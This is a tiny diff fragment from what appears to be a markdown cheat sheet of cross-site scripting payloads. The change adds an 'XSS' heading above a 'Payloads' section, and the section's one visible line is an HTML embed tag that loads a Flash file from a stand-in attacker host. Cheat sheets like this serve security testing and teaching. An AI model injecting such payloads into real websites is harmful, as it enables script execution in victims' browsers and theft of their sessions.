@@ -1,3 +1,4 @@
+# XSS
 ## Payloads
 ```html
 <embed src="http://hacker.site/evil.swf">
